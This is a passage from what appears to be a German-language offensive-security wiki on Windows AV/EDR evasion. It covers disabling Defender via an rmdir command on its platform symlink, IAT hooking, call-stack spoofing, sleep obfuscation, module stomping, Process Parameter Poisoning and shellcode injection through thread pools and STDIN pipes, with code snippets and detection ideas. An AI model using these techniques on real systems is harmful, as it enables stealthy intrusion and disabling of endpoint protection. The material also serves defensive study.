- DLL sideloading/code execution: Legen Sie DLLs ab oder ersetzen Sie DLLs, die Defender aus seinem Anwendungsverzeichnis lädt, um Code in den Prozessen von Defender auszuführen. Siehe den obigen Abschnitt: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Service kill/denial: Entfernen Sie den Version-Symlink, damit der konfigurierte Pfad beim nächsten Start nicht mehr aufgelöst werden kann und Defender nicht startet:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```

> [!TIP]
> Beachte, dass diese Technik für sich genommen keine Privilegienausweitung ermöglicht; sie erfordert Adminrechte.

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

Red Teams können Runtime-Evasion aus dem C2-Implant in das Zielmodul selbst verlagern, indem sie dessen Import Address Table (IAT) hooken und ausgewählte APIs über angreiferkontrollierten, positionsunabhängigen Code (PIC) leiten. Dadurch lässt sich die Evasion über die kleine API-Oberfläche hinaus verallgemeinern, die viele Kits bereitstellen (z. B. CreateProcessA), und derselbe Schutz auf BOFs und Post-Exploitation-DLLs ausweiten.<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>

Vorgehensweise auf hoher Ebene
- Ein PIC-Blob mithilfe eines Reflective Loaders zusammen mit dem Zielmodul bereitstellen (vorangestellt oder als Begleitdatei). Der PIC muss in sich geschlossen und positionsunabhängig sein.
- Beim Laden der Host-DLL ihre IMAGE_IMPORT_DESCRIPTOR durchlaufen und die IAT-Einträge für die ausgewählten Imports (z. B. CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc) so patchen, dass sie auf schlanke PIC-Wrapper zeigen.
- Jeder PIC-Wrapper führt vor dem Tail-Call an die echte API-Adresse Evasion-Techniken aus. Typische Techniken sind:
  - Speicher vor und nach dem Aufruf maskieren bzw. demaskieren (z. B. Beacon-Bereiche verschlüsseln, RWX→RX, Seitennamen/-berechtigungen ändern) und anschließend den ursprünglichen Zustand wiederherstellen.
  - Call-Stack Spoofing: einen harmlosen Stack erstellen und zur Ziel-API wechseln, sodass die Call-Stack-Analyse erwartete Frames auflöst.<sup>[[9]](#references)</sup>
- Für Kompatibilität eine Schnittstelle exportieren, über die ein Aggressor-Script (oder ein Äquivalent) registrieren kann, welche APIs für Beacon, BOFs und Post-Ex-DLLs gehookt werden sollen.

Warum hier IAT Hooking
- Funktioniert mit jedem Code, der den gehookten Import verwendet, ohne den Tool-Code zu ändern oder sich darauf zu verlassen, dass Beacon bestimmte APIs proxyt.
- Deckt Post-Ex-DLLs ab: Durch das Hooking von LoadLibrary* lassen sich Modulladevorgänge abfangen (z. B. System.Management.Automation.dll, clr.dll) und dieselben Maskierungs- und Stack-Evasion-Techniken auf deren API-Aufrufe anwenden.
- Ermöglicht durch das Wrapping von CreateProcessA/W wieder die zuverlässige Verwendung von Post-Ex-Befehlen, die Prozesse starten, gegen Call-Stack-basierte Erkennungen.

Minimales IAT-Hook-Schema (x64-C/C++-Pseudocode)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Notizen
- Wende den Patch nach Relocations/ASLR und vor der ersten Verwendung des Imports an. Reflective Loader wie TitanLdr/AceLdr zeigen Hooking während `DllMain` des geladenen Moduls.
- Halte Wrapper klein und PIC-sicher; löse die echte API über den ursprünglichen IAT-Wert auf, den du vor dem Patchen gesichert hast, oder über `LdrGetProcedureAddress`.
- Verwende für PIC RW → RX-Übergänge und lasse keine Seiten mit Schreib- und Ausführungsrechten zurück.

Call-Stack-Spoofing-Stub
- PIC-Stub-Techniken im Stil von Draugr erstellen eine gefälschte Call Chain (mit Return Addresses in benignen Modulen) und springen dann in die echte API.
- Damit lassen sich Erkennungen umgehen, die bei sensiblen APIs kanonische Stacks von Beacon/BOFs erwarten.
- Kombiniere dies mit Stack-Cutting-/Stack-Stitching-Techniken, um vor dem API-Prolog innerhalb erwarteter Frames zu landen.

Operative Integration
- Stelle den Reflective Loader den Post-Ex-DLLs voran, damit PIC und Hooks beim Laden der DLL automatisch initialisiert werden.
- Verwende ein Aggressor-Script, um Ziel-APIs zu registrieren. So profitieren Beacon und BOFs transparent und ohne Codeänderungen vom selben Evasion-Pfad.

Erkennungs-/DFIR-Aspekte
- IAT-Integrität: Einträge, die auf Adressen außerhalb von Images (Heap/anon) verweisen; regelmäßige Überprüfung von Import-Pointern.
- Stack-Anomalien: Return Addresses, die zu keinem geladenen Image gehören; abrupte Übergänge zu nicht-image-basiertem PIC; inkonsistente `RtlUserThreadStart`-Abstammung.
- Loader-Telemetrie: prozessinterne Schreibvorgänge in die IAT, frühe Aktivitäten in `DllMain`, die Import-Thunks ändern, unerwartet beim Laden erstellte RX-Regionen.
- Image-Load-Evasion: Wenn `LoadLibrary*` gehookt wird, verdächtige Ladevorgänge von Automation-/CLR-Assemblies überwachen, die zeitlich mit Memory-Masking-Ereignissen korrelieren.

Verwandte Bausteine und Beispiele
- Reflective Loader, die während des Ladens IAT-Patching durchführen (z. B. TitanLdr, AceLdr)
- Memory-Masking-Hooks (z. B. simplehook) und Stack-Cutting-PIC (stackcutting)
- PIC-Call-Stack-Spoofing-Stub-Techniken (z. B. Draugr)


## IAT-Hooking zur Importzeit + Sleep Obfuscation (Crystal Palace/PICO)

### IAT-Hooks zur Importzeit über ein resident PICO

Wenn du einen Reflective Loader kontrollierst, kannst du Imports **während** `ProcessImports()` hooken, indem du den `GetProcAddress`-Zeiger des Loaders durch einen eigenen Resolver ersetzt, der zuerst Hooks prüft:<sup>[[6]](#references)[[7]](#references)[[8]](#references)</sup>

- Erstelle ein **resident PICO** (persistentes PIC-Objekt), das bestehen bleibt, nachdem sich das temporäre Loader-PIC freigegeben hat.
- Exportiere eine Funktion `setup_hooks()`, die den Import-Resolver des Loaders überschreibt (z. B. `funcs.GetProcAddress = _GetProcAddress`).
- Überspringe in `_GetProcAddress` Ordinal-Imports und verwende eine hashbasierte Hook-Suche wie `__resolve_hook(ror13hash(name))`. Gibt es einen Hook, gib ihn zurück; andernfalls delegiere an das echte `GetProcAddress`.
- Registriere Hook-Ziele beim Linken mit Crystal-Palace-Einträgen der Form `addhook "MODULE$Func" "hook"`. Der Hook bleibt gültig, weil er sich im resident PICO befindet.

So entsteht eine **IAT-Umleitung zur Importzeit**, ohne den Codeabschnitt der geladenen DLL nach dem Laden patchen zu müssen.

### Hookbare Imports erzwingen, wenn das Ziel PEB-Walking verwendet

Hooks zur Importzeit werden nur ausgelöst, wenn die Funktion tatsächlich in der IAT des Ziels steht. Wenn ein Modul APIs per PEB-Walk + Hash auflöst (ohne Import-Eintrag), erzwinge einen echten Import, damit der `ProcessImports()`-Pfad des Loaders ihn verarbeitet:

- Ersetze die Auflösung gehashter Exports (z. B. `GetSymbolAddress(..., HASH_FUNC_WAIT_FOR_SINGLE_OBJECT)`) durch eine direkte Referenz wie `&WaitForSingleObject`.
- Der Compiler erzeugt einen IAT-Eintrag, wodurch der Reflective Loader den Import beim Auflösen abfangen kann.

### Ekko-artige Sleep-/Idle-Obfuscation ohne `Sleep()` zu patchen

Statt `Sleep` zu patchen, hooke die **tatsächlichen Wait-/IPC-Primitiven**, die das Implantat verwendet (`WaitForSingleObject(Ex)`, `WaitForMultipleObjects`, `ConnectNamedPipe`). Bei langen Wartezeiten kannst du den Aufruf in eine Ekko-artige Obfuscation Chain einbinden, die das Image im Speicher während der Idle-Zeit verschlüsselt:<sup>[[31]](#references)[[27]](#references)</sup>

- Verwende `CreateTimerQueueTimer`, um eine Folge von Callbacks einzuplanen, die `NtContinue` mit erstellten `CONTEXT`-Frames aufrufen.
- Typische Chain (x64): Image auf `PAGE_READWRITE` setzen → mit `advapi32!SystemFunction032` das gesamte gemappte Image per RC4 verschlüsseln → den blockierenden Wait ausführen → per RC4 entschlüsseln → **abschnittsspezifische Berechtigungen wiederherstellen**, indem die PE-Abschnitte durchlaufen werden → Abschluss signalisieren.
- `RtlCaptureContext` liefert eine Vorlage für einen `CONTEXT`; dupliziere sie in mehrere Frames und setze Register (`Rip/Rcx/Rdx/R8/R9`), um jeden Schritt aufzurufen.

Operatives Detail: Gib bei langen Waits (z. B. `WAIT_OBJECT_0`) „success“ zurück, damit der Aufrufer fortfährt, während das Image maskiert ist. Dieses Muster verbirgt das Modul während Idle-Zeitfenstern vor Scannern und vermeidet die typische Signatur von gepatchtem `Sleep()`.

Erkennungsideen (telemetriebasiert)
- Serien von `CreateTimerQueueTimer`-Callbacks, die auf `NtContinue` verweisen.
- Verwendung von `advapi32!SystemFunction032` auf großen, zusammenhängenden Puffern in Image-Größe.
- `VirtualProtect` auf großen Speicherbereichen, gefolgt von der Wiederherstellung benutzerdefinierter abschnittsspezifischer Berechtigungen.

### CFG zur Laufzeit für Sleep-Obfuscation-Gadgets registrieren

Auf CFG-aktivierten Zielen führt der erste indirekte Sprung in ein Mid-Function-Gadget wie `jmp [rbx]` oder `jmp rdi` normalerweise zum Absturz des Prozesses mit `STATUS_STACK_BUFFER_OVERRUN`, weil das Gadget nicht in den CFG-Metadaten des Moduls enthalten ist. Damit Ekko-/Kraken-artige Chains in gehärteten Prozessen funktionieren:<sup>[[30]](#references)</sup>

- Registriere jedes von der Chain verwendete indirekte Ziel mit `NtSetInformationVirtualMemory(..., VmCfgCallTargetInformation, ...)` und `CFG_CALL_TARGET_VALID`-Einträgen.
- Bei Adressen innerhalb geladener Images (`ntdll`, `kernel32`, `advapi32`) muss der `MEMORY_RANGE_ENTRY` an der **Image-Basis** beginnen und die **gesamte Image-Größe** umfassen.
- Verwende bei manuell gemappten/PIC-/gestomped-Regionen stattdessen die **Allocation-Basis** und die Größe der Allokation.
- Markiere nicht nur das Dispatch-Gadget, sondern auch indirekt aufgerufene Exports (`NtContinue`, `SystemFunction032`, `VirtualProtect`, `GetThreadContext`, `SetThreadContext`, Wait-/Event-Systemaufrufe) sowie alle ausführbaren, vom Angreifer kontrollierten Abschnitte, die zu indirekten Zielen werden.

Dadurch werden Sleep-Chains im ROP-/JOP-Stil von „funktioniert nur in Prozessen ohne CFG“ zu einer wiederverwendbaren Primitive für `explorer.exe`, Browser, `svchost.exe` und andere mit `/guard:cf` kompilierte Endpunkte.

### CET-sicheres Stack-Spoofing für schlafende Threads

Ein vollständiger `CONTEXT`-Austausch ist auffällig und kann auf CET-Shadow-Stack-Systemen scheitern, weil ein gefälschtes `Rip` weiterhin mit dem Hardware-Shadow-Stack übereinstimmen muss. Ein sichereres Muster für Sleep-Masking ist:<sup>[[30]](#references)</sup>

- Wähle einen anderen Thread desselben Prozesses aus und lies seine `NT_TIB`-/TEB-Stack-Grenzen (`StackBase`, `StackLimit`) über `NtQueryInformationThread` aus.
- Sichere den echten TEB/TIB des aktuellen Threads.
- Erfasse den echten Sleep-Kontext mit `GetThreadContext`.
- Kopiere **nur** das echte `Rip` in den Spoof-Kontext und lasse den gefälschten `Rsp`-/Stack-Zustand unverändert.
- Kopiere während des Sleep-Zeitfensters den `NT_TIB` des Spoof-Threads in den TEB des aktuellen Threads, damit Stack-Walker innerhalb eines legitimen Stack-Bereichs zurückverfolgen.
- Stelle nach dem Wait den ursprünglichen TIB und Thread-Kontext wieder her.

So bleibt der Instruction Pointer CET-kompatibel, während EDR-Stack-Walker irregeführt werden, die TEB-Stack-Metadaten zur Validierung von Unwinds verwenden.

### APC-basierte Alternative: Kraken Mask

Wenn die Timer-Queue-Dispatch-Signatur zu auffällig ist, lässt sich dieselbe Sleep-Encrypt-Spoof-Restore-Sequenz von einem angehaltenen Hilfsthread über eingereihte APCs ausführen:<sup>[[27]](#references)</sup>

- Erstelle einen Hilfsthread mit `NtTestAlert` als Entry Point.
- Reihe vorbereitete `CONTEXT`-Frames/APCs mit `NtQueueApcThread` ein und führe sie mit `NtAlertResumeThread` aus.
- Speichere den Chain-Zustand auf dem Heap statt auf dem Stack des Hilfsthreads, um ein Erschöpfen des standardmäßigen 64-KB-Thread-Stacks zu vermeiden.
- Verwende `NtSignalAndWaitForSingleObject`, um atomar das Start-Event zu signalisieren und zu blockieren.
- Halte den Hauptthread an, bevor du TIB/Kontext wiederherstellst (`NtSuspendThread` → Wiederherstellen → `NtResumeThread`), um das Zeitfenster zu verkleinern, in dem ein Scanner einen teilweise wiederhergestellten Stack erkennen könnte.

Damit wird die Signatur `CreateTimerQueueTimer` + `NtContinue` durch eine Hilfsthread-/APC-Signatur ersetzt, während dieselben Ziele für RC4-Masking und Stack-Spoofing erhalten bleiben.

Zusätzliche Erkennungsideen
- `NtSetInformationVirtualMemory` mit `VmCfgCallTargetInformation` kurz vor Sleeps, Waits oder APC-Dispatch.
- `GetThreadContext`/`SetThreadContext` in Verbindung mit `WaitForSingleObject(Ex)`, `NtWaitForSingleObject`, `NtSignalAndWaitForSingleObject` oder `ConnectNamedPipe`.
- Auf `NtQueryInformationThread` folgende direkte Schreibvorgänge in die Stack-Grenzen des TEB/TIB des aktuellen Threads.
- `NtQueueApcThread`-/`NtAlertResumeThread`-Chains, die indirekt `SystemFunction032`, `VirtualProtect` oder Hilfsfunktionen zur Wiederherstellung der Abschnittsberechtigungen aufrufen.
- Wiederholte Verwendung kurzer Gadget-Signaturen wie `FF 23` (`jmp [rbx]`) oder `FF E7` (`jmp rdi`) als Dispatch-Pivots innerhalb signierter Module.


## Präzises Module Stomping

Beim Module Stomping werden Payloads aus dem **`.text`-Abschnitt einer DLL ausgeführt, die bereits im Zielprozess gemappt ist**, statt auffälligen privaten ausführbaren Speicher zu allokieren oder eine neue sacrificial DLL zu laden. Als Überschreibziel sollte ein **geladenes, dateigestütztes Image** dienen, dessen Codebereich die Payload aufnehmen kann, ohne noch benötigte Codepfade des Prozesses zu beschädigen.<sup>[[1]](#references)[[2]](#references)</sup>

### Zuverlässige Zielauswahl

Naives Stomping gegen verbreitete Module wie `uxtheme.dll` oder `comctl32.dll` ist fragil: Die DLL ist möglicherweise nicht im Remote-Prozess geladen, und ein zu kleiner Codebereich kann den Prozess zum Absturz bringen. Ein zuverlässigerer Ablauf:

1. Zähle die Module des Zielprozesses auf und behalte eine **Include-Liste nur mit Namen** der bereits geladenen DLLs.
2. Erstelle zuerst die Payload und notiere ihre **exakte Byte-Größe**.
3. Durchsuche Kandidaten-DLLs auf der Festplatte und vergleiche die **`.text`-`Misc_VirtualSize`** des PE-Abschnitts mit der Payload-Größe. Das ist wichtiger als die Dateigröße, da sie die Größe des ausführbaren Abschnitts **im gemappten Speicher** widerspiegelt.
4. Parse die **Export Address Table (EAT)** und wähle eine RVA einer exportierten Funktion als Start-Offset für das Stomping.
5. Berechne den **Blast Radius**: Überschreitet die Payload die Grenze der ausgewählten Funktion, überschreibt sie benachbarte Exports, die danach im Speicher angeordnet sind.

Typische Recon-/Auswahl-Hilfsprogramme aus der Praxis:

```cmd
list-process-dlls.exe -p <PID> -n -o c:\payloads\modules.txt
python find-stompable-dlls.py -d c:\Windows\System32 -i c:\payloads\modules.txt <payload_size>
python dump-exports.py -f <dll_path>
python blast-radius.py -f <dll_path> -fnc <export_name> -s <payload_size>
```

Betriebshinweise
- Bevorzuge DLLs, die im Remote-Prozess **bereits geladen** sind, um die Telemetrie von `LoadLibrary`/unerwarteten Image-Ladevorgängen zu vermeiden.
- Bevorzuge Exports, die von der Zielanwendung selten ausgeführt werden. Andernfalls können normale Codepfade die überschriebenen Bytes vor oder nach der Thread-Erstellung erreichen.
- Bei großen Implants muss die Einbettung des Shellcodes oft von einem String-Literal auf einen **Byte-Array-/Braced-Initializer** umgestellt werden, damit der vollständige Buffer im Injector-Quellcode korrekt dargestellt wird.

Erkennungsmöglichkeiten
- Remote-Schreibvorgänge in **ausführbare, imagegestützte Speicherseiten** (`MEM_IMAGE`, `PAGE_EXECUTE*`) statt in die häufigeren privaten RWX/RX-Allokationen.
- Export-Einstiegspunkte, deren Bytes im Speicher nicht mehr mit der zugrunde liegenden Datei auf dem Datenträger übereinstimmen.
- Remote-Threads oder Kontextwechsel, deren Ausführung innerhalb eines legitimen DLL-Exports beginnt, dessen erste Bytes kurz zuvor geändert wurden.
- Verdächtige Folgen von `VirtualProtect(Ex)`-/`WriteProcessMemory`-Aufrufen auf DLL-`.text`-Seiten, gefolgt von einer Thread-Erstellung.

## Process Parameter Poisoning (P3)

Process Parameter Poisoning (P3) ist eine **Process-Injection-/EDR-Evasion-Technik**, die den klassischen Remote-Schreibpfad (`VirtualAllocEx` + `WriteProcessMemory`) umgeht. Statt Bytes in ein bereits laufendes Ziel zu kopieren, nutzt sie aus, dass Windows **ausgewählte Startparameter von `CreateProcessW` in den Child-Prozess kopiert** und sie in `PEB->ProcessParameters` (`RTL_USER_PROCESS_PARAMETERS`) speichert.<sup>[[28]](#references)[[29]](#references)</sup>

### Durch `CreateProcessW` kopierte, manipulierbare Datenfelder

Nützliche Datenfelder sind:

- `lpCommandLine` → `RTL_USER_PROCESS_PARAMETERS.CommandLine`
- `lpEnvironment` (mit `CREATE_UNICODE_ENVIRONMENT`) → `RTL_USER_PROCESS_PARAMETERS.Environment`
- `STARTUPINFO.lpReserved` → `RTL_USER_PROCESS_PARAMETERS.ShellInfo`

Einschränkungen der Datenfelder in der Praxis:

- `lpCommandLine` muss für `CreateProcessW` auf **beschreibbaren Speicher** zeigen und ist auf **32.767 Unicode-Zeichen** einschließlich des Nullterminators begrenzt.
- `lpEnvironment` muss ein Unicode-Umgebungsblock aus aufeinanderfolgenden `NAME=VALUE\0`-Strings sein, auf die ein zusätzliches `\0` folgt.
- `lpReserved` ist offiziell reserviert. Die Zuordnung zu `ShellInfo` sollte daher als Implementierungsdetail und nicht als stabiler, dokumentierter Vertrag betrachtet werden.

Dadurch wird die normale Prozesserstellung zum **Primitive für die Payload-Übertragung**. Der Operator erstellt den Child-Prozess mit vom Angreifer kontrollierten Startdaten und überlässt Windows das prozessübergreifende Kopieren.

### Remote-Suchablauf ohne Remote-Schreib-APIs

Nachdem der Child-Prozess erstellt wurde, lässt sich der kopierte Buffer mit **schreibgeschützten** Primitives auflösen:

1. `NtQueryInformationProcess(ProcessBasicInformation)` → `PROCESS_BASIC_INFORMATION.PebBaseAddress` ermitteln
2. Remote-`PEB` lesen
3. `PEB.ProcessParameters` folgen
4. `RTL_USER_PROCESS_PARAMETERS` lesen
5. Den ausgewählten Zeiger verwenden:
   - `parameters.CommandLine.Buffer`
   - `parameters.Environment`
   - `parameters.ShellInfo.Buffer`

Minimaler Ablauf:

```c
NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &retLen);
NtReadVirtualMemoryEx(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), &bytesRead, 0);
NtReadVirtualMemoryEx(hProcess, peb.ProcessParameters, &params, sizeof(params), &bytesRead, 0);
// params.CommandLine.Buffer / params.Environment / params.ShellInfo.Buffer
```

### Ausführen des kopierten Parameterpuffers

Die kopierte Parameterregion ist normalerweise `RW`, also nicht ausführbar. Eine gängige P3-Kette ist:

1. Den Prozess normal erstellen (nicht angehalten)
2. Die ausgewählte Parameterseite mit `NtProtectVirtualMemory` / `VirtualProtectEx` ausführbar machen
3. Den bereits in `PROCESS_INFORMATION` zurückgegebenen Handle des Hauptthreads wiederverwenden
4. Die Ausführung mit `NtSetContextThread` umleiten (`CONTEXT_CONTROL`, `RIP` überschreiben)

Im Gegensatz zu klassischen Thread-Hijacking-Abläufen sind hierfür **`SuspendThread` / `ResumeThread` nicht erforderlich**; der Kontext kann direkt über den zurückgegebenen Handle des Hauptthreads geändert werden.

Dadurch werden mehrere APIs vermieden, die häufig auf Injection überwacht werden:

- `VirtualAllocEx` / `NtAllocateVirtualMemory(Ex)`
- `WriteProcessMemory` / `NtWriteVirtualMemory`
- `CreateRemoteThread` / `NtCreateThreadEx`
- oft auch `SuspendThread` / `ResumeThread`

### Nullbyte-Einschränkung und gestaffelter Shellcode

Alle drei Träger sind **Zeichenketten oder zeichenkettenähnliche Daten**, daher wird eine rohe Payload mit `0x00` während der Übertragung abgeschnitten. Eine praktikable Umgehung ist eine **nullbytefreie erste Stufe**, die Konstanten zur Laufzeit rekonstruiert und dann eine beliebige zweite Stufe lädt.

Ein einfaches Muster ist die XOR-basierte Synthese von Konstanten:

```asm
mov rax, XOR_A
mov r15, XOR_B
xor rax, r15 ; result = desired value, without embedding 0x00 bytes
```

This ermöglicht es der ersten Stufe, Stack-Strings, API-Argumente, DLL-Pfade oder einen Shellcode-Loader der zweiten Stufe zu erstellen, ohne Nullbytes in den übertragenen Parameter einzubetten.

### Stack-basierte API-Aufrufe aus der ersten Stufe

Wenn die erste Stufe APIs wie `LoadLibraryA` aufrufen muss, kann sie:

- den String/Puffer auf den Stack des Ziels legen
- den **32-Byte-x64-Shadow-Space** reservieren
- `RCX`, `RDX`, `R8`, `R9` auf Konstanten oder `RSP`-relative Zeiger setzen
- `RSP` vor dem Aufruf **16-Byte-ausgerichtet** halten

Anschließend kann eine zweite Stufe vom Stack in eine `PAGE_READWRITE`-Speicherzuweisung kopiert, mit `VirtualProtect` in `PAGE_EXECUTE_READ` geändert und angesprungen werden. So wird eine direkte RWX-Speicherzuweisung vermieden.

### Erkennungsmöglichkeiten

Laut den Autoren bieten sich folgende Ansätze zur Suche an:

- `VirtualProtectEx` / `NtProtectVirtualMemory`, wenn damit **Prozessparameterseiten ausführbar gemacht werden**
- auf diese Schutzänderung folgendes `SetThreadContext` / `NtSetContextThread`
- Remote-Lesezugriffe auf `PEB` und danach auf `RTL_USER_PROCESS_PARAMETERS`
- ungewöhnlich lange oder entropiereiche Werte für `lpCommandLine`, `lpEnvironment` oder `STARTUPINFO.lpReserved` bei der Prozesserstellung

### Hinweise

- P3 ist ein **prozessübergreifender Übertragungstrick** und für sich genommen keine vollständige Ausführungsprimitive: Für den kopierten Parameter sind weiterhin eine Änderung der Ausführungsberechtigung und eine Methode zur Umleitung der Ausführung erforderlich.
- `RtlCreateProcessReflection` / Dirty Vanity wurde von den Autoren erwogen, aber verworfen, da intern verdächtige Primitive wie `NtWriteVirtualMemory` und `NtCreateThreadEx` zum Einsatz kommen.

## Console STDIN pipe injection

Ein interaktiver Konsolenprozess kann ebenfalls als **Payload-Übertragungsprimitive** verwendet werden. Der Injector leitet die Standardeingabe des Kindprozesses in eine Pipe um und sendet einen Marker gefolgt von Shellcode. Nachdem das Konsolenprogramm die Daten in seinen eigenen privaten Speicher eingelesen hat, sucht der Injector diesen Puffer, macht ihn ausführbar und leitet einen Thread des Kindprozesses dorthin um. Dadurch werden `VirtualAllocEx` und `WriteProcessMemory` vermieden; es handelt sich jedoch weiterhin um Process Injection und nicht um einen allgemeinen EDR-Bypass.<sup>[[41]](#references)</sup>

Trotz der Beschreibung als „named-pipe“ ruft die Referenzimplementierung `CreatePipe` auf, wodurch eine **anonyme Pipe** erstellt wird. Windows implementiert anonyme Pipes intern mit eindeutig benannten Pipe-Objekten, doch der PoC wählt weder einen Pfad wie `\\.\pipe\<name>` aus noch ruft er `CreateNamedPipe` auf. Er erstellt vererbbare Handles mit einem standardmäßigen Sicherheitsdeskriptor, setzt das Lese-Handle in `STARTUPINFO.hStdInput`, aktiviert `STARTF_USESTDHANDLES` und startet einen neuen Kindprozess mit aktivierter Handle-Vererbung. Daher startet dieser PoC die angegebene Konsolenanwendung; er verbindet die Pipe nicht mit einem bereits laufenden Prozess.<sup>[[41]](#references)[[42]](#references)[[43]](#references)</sup>

### Referenzablauf

Die Implementierung verwendet die folgende Abfolge:<sup>[[41]](#references)</sup>

1. Anonyme Pipe-Paare für `STDIN` und `STDOUT` des Kindprozesses erstellen. Die Vererbung für die beiden Handles auf Elternseite deaktivieren und nach der Prozesserstellung die Duplikate auf Kindseite im Elternprozess schließen.
2. Eine interaktive ausführbare Datei wie `netsh.exe` oder `nslookup.exe` mit `CREATE_NEW_CONSOLE` starten. Der Kindprozess erbt die umgeleiteten Standard-Handles.
3. Das vollständige binäre `rawData`-Array mit `WriteFile` über das `STDIN`-Handle auf Elternseite senden. Das Konsolenprogramm liest die Bytes ein und hinterlässt eine Kopie in einem seiner privaten, bestätigten Speicherbereiche.
4. Den Adressraum des Kindprozesses mit `VirtualQueryEx` durchlaufen, mögliche `MEM_PRIVATE`-Bereiche mit `ReadProcessMemory` lesen und am Anfang von `rawData` nach dem Marker suchen.
5. Den gefundenen Puffer mit `VirtualProtectEx` in `PAGE_EXECUTE_READWRITE` ändern.
6. Den Hauptthread identifizieren, anhalten, `RIP` mit `NtSetContextThread` auf `found_address + 0x19` setzen und den Thread fortsetzen.

```powershell
InjectSetConsole.exe C:\Windows\System32\netsh.exe
```

Die bereitgestellte Implementierung ist x64-spezifisch: Sie ändert `CONTEXT.Rip`, und ihr eingebetteter Payload ist x64-Shellcode. `rawData` beginnt mit einem 25 Byte langen Marker, daher beginnen die ausführbaren Bytes beim hexadezimalen Offset `0x19`. Achte beim Ersetzen des Payloads darauf, dieses Layout beizubehalten, oder aktualisiere Marker, Suchvektor, Arraygröße und Ausführungs-Offset gemeinsam. In den Quellkommentaren sind außerdem `0x0A`, `0x0D` und `0x1A` als Bad Characters aufgeführt. Dieser Workflow ändert weder das Token noch die Berechtigungen des Child-Prozesses.<sup>[[41]](#references)</sup>

Kleine native Hilfsprogramme und Muster für die Payload-Kompilierung findest du unter [Windows C Payloads](windows-local-privilege-escalation/windows-c-payloads.md).

## Thread-Pool-Callback-DLL-Injection ohne Shellcode (DLLParty)

DLLParty passt eine Thread-Pool-Injection nach PoolParty-Art so an, dass ein vorhandener Worker des Zielprozesses `LoadLibraryA` aufruft, anstatt einen injizierten Callback-Stub auszuführen. Das Dispatch-Primitiv ist ein `TP_DIRECT`, das an den I/O-Completion-Port des Ziel-Thread-Pools übermittelt wird. Dadurch werden Prozessberechtigungen nicht umgangen: Der PoC ruft `OpenProcess(PROCESS_ALL_ACCESS)` auf und benötigt les- und beschreibbaren Speicher im Zielprozess sowie duplizierbare Handles für Worker-Factory und Completion-Port.<sup>[[46]](#references)[[47]](#references)</sup>

Unter Windows x64 übergibt der Worker in `RCX`, dem ersten Callback-Argument, einen Zeiger auf eine stackbasierte `TP_CALLBACK_INSTANCE`. `LoadLibraryA` interpretiert denselben Zeiger als `LPCSTR`. Im getesteten Ablauf erstellt `TppWorkerThread` den Zeiger bei `RSP+0x178`, während der erste reguläre Schreibzugriff in dieses Objekt bei `RSP+0x1d0` erfolgt. Ein nullterminierter DLL-Pfad, der in dieses Präfix von 0x58 Byte passt, kann daher am Anfang der Instanz liegen, ohne vor dem Dispatch überschrieben zu werden. Dies ist eine beobachtete Eigenschaft dieses Builds und keine dokumentierte Windows-ABI-Garantie.<sup>[[46]](#references)[[47]](#references)</sup>

Der Referenz-Workflow lautet:<sup>[[46]](#references)[[47]](#references)</sup>

1. Ermittle die Handles des Zielprozesses mit `NtQuerySystemInformation(SystemHandleInformation)` und identifiziere `TpWorkerFactory`, indem du die Objekttypen abfragst. Dupliziere ein Worker-Factory-Handle und frage `WorkerFactoryBasicInformation` ab; `StartParameter` liefert den entfernten `TP_POOL`. Überspringe Factories mit `TotalWorkerCount == 0`.
2. Lies `TP_POOL.CompletionPort` aus und durchlaufe die private Worker-Liste des Pools. Im getesteten Windows-10-19045-x64-Build (`ntdll.dll 10.0.19041.4842`) befindet sich ihr Kopf bei `pool+0x60`; jeder Link liegt bei `worker+0x10`, sodass der Slot der Callback-Instanz bei `worker+0x38` dem Wert `link+0x28` entspricht. Der PoC prüft Zeigerausrichtung, Link-Reziprozität, Pool-Zugehörigkeit, nicht leere Thread-IDs, doppelte Knoten und einen stabilen Listenkopf.
3. Schreibe den DLL-Pfad in **jeden** ermittelten Worker-Slot, da der Completion-Eintrag von jedem Worker verarbeitet werden kann. Platziere ein `TP_DIRECT` mit `Callback = LoadLibraryA` in beschreibbaren Speicher des Zielprozesses. Der PoC verwendet `last_slot-0x500` auf einem Worker-Stack anstelle von `VirtualAllocEx`; dieser Offset ist experimentell und darf nicht mit aktiven Stackdaten kollidieren.
4. Dupliziere das Handle des Completion-Ports des Zielprozesses und rufe `ZwSetIoCompletion(port, remote_direct, 0, 0, 0)` auf. Die Adresse des entfernten `TP_DIRECT` dient als Completion-Key. Ein vorhandener Worker ruft dann `LoadLibraryA` mit seinem überschriebenen Zeiger auf die Callback-Instanz auf und lädt eine DLL, auf die der Zielprozess bereits zugreifen kann.

Der PoC erwartet eine Ziel-PID (`DLLParty.exe <target_pid>`) und verwendet einen fest codierten DLL-Pfad in `DLLParty.cpp`; lege vor dem Erstellen einer x64-Executable einen Pfad fest, auf den der Zielprozess zugreifen kann. Außerdem verwendet er die `LoadLibraryA`-Adresse seines eigenen Prozesses als entfernten Callback und setzt daher voraus, dass diese Adresse im Zielprozess gültig ist. Der Code prüft weder, ob die Pfadlänge in das Präfix von 0x58 Byte passt, noch, ob die Worker-Durchlauf-Routine einen Slot gefunden hat, bevor sie das letzte Element indiziert. Überprüfe die privaten Offsets, das Stack-Layout und den beschreibbaren Speicher für den Ziel-Build erneut. Der Verzicht auf `CreateRemoteThreadEx`, Shellcode und `VirtualAllocEx` beseitigt weder prozessübergreifende Schreibzugriffe noch Telemetrie zum Laden von DLLs.<sup>[[46]](#references)[[47]](#references)</sup>

## SantaStealer-Taktiken für dateilose Umgehung und Diebstahl von Zugangsdaten

SantaStealer (auch bekannt als BluelineStealer) zeigt, wie moderne Info-Stealer AV-Umgehung, Anti-Analyse und den Zugriff auf Zugangsdaten in einem einzigen Workflow kombinieren.<sup>[[24]](#references)</sup>

### Tastaturlayout-Prüfung und Sandbox-Verzögerung

